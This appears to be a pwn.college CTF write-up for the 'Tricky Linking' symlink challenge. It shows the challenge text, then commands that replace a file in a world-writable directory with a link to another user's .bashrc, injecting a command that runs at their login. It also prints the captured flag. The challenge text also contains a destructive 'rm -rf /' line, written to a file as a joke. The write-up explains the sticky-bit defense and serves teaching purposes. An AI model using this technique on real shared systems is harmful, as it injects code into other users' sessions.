# Linux Luminarium
# Module 15: Silly Sehnanigans

## Tricky Linking
Okay, Zardus has wised up! No more sharing the home directory: despite the reduced convenience, Zardus has moved to sharing /tmp/collab. He's made that directory world-writable and has started a list of evil commands to remember!

```
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "rm -rf /" > /tmp/collab/evil-commands.txt
```
In this challenge, when you run /challenge/victim, Zardus will add cat /flag to that list of commands:

```
hacker@dojo:~$ /challenge/victim

Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout

hacker@dojo:~$
```
Recall from the previous level that, having write access to /tmp/collab, the hacker user can replace that evil-commands.txt file. Also remember from Comprehending Commands that files can link to other files. What happens if hacker replaces evil-commands.txt with a symbolic link to some sensitive file that zardus can write to? Chaos and shenanigans!

You know the file to link to. Pull off the attack, and get /flag (which, for this level, Zardus can read again!).

HINT: You'll need to run /challenge/victim twice: once to get cat /flag written to where you want, and once to trigger it!

Is /tmp dangerous to use??? Despite the attack shown here, /tmp can be used safely. The directory is world-writable, but has a special permission bit set:

```
hacker@dojo:~$ ls -ld /tmp
drwxrwxrwt 29 root root 1056768 Jun  6 14:06 /tmp
hacker@dojo:~$
```
That t bit at the end is the sticky bit. The sticky bit means that the directory only allows the owners of files to rename or remove files in the directory. It's designed to prevent this exact attack! The problem in this challenge, of course, was that Zardus did not enable the sticky bit on /tmp/collab. This would have closed the hole in this specific case:

```
zardus@dojo:~$ chmod +t /tmp/collab
```
Of course, shared resources like world-writable directories are still dangerous. Much later, in the Race Conditions of the Green Belt material, you'll see many ways in which such resources can cause security issues!

### Solve
**Flag:** `pwn.college{UtK6HeB3Ap7MC0f-CvgEREbqM8M.0VM0EzNxwiNyUDN0EzW}`

This challenge demonstrated a classic symlink attack. Zardus stored commands inside a file located in the world-writable /tmp/collab directory. Because the directory lacked the sticky bit, the original evil-commands.txt could be deleted and replaced with a symbolic link. The file was replaced with a symlink pointing to /home/zardus/.bashrc. When Zardus later appended cat /flag to evil-commands.txt, the command was actually written into .bashrc. On the next login, Bash executed the modified .bashrc, causing the flag to be printed automatically.

```bash
hacker@shenanigans~tricky-linking:~$ rm /tmp/collab/evil-commands.txt
rm: remove write-protected regular file '/tmp/collab/evil-commands.txt'? y
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
zardus@shenanigans~tricky-linking:~$ ***********
-bash: 2970530795: command not found
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt

zardus@shenanigans~tricky-linking:~$ exit

logout
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
pwn.college{UtK6HeB3Ap7MC0f-CvgEREbqM8M.0VM0EzNxwiNyUDN0EzW}
zardus@shenanigans~tricky-linking:~$ ***********
-bash: 2970530795: command not found
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt

zardus@shenanigans~tricky-linking:~$ exit

logout
```

### New Learnings
Learned how symbolic links can redirect writes intended for one file into a completely different file. Reinforced that write access to a world-writable directory can be dangerous because attackers may replace legitimate files with symlinks to sensitive targets. Also learned the purpose of the sticky bit (t) on directories such as /tmp, which prevents users from deleting or replacing files they do not own and helps defend against this type of attack.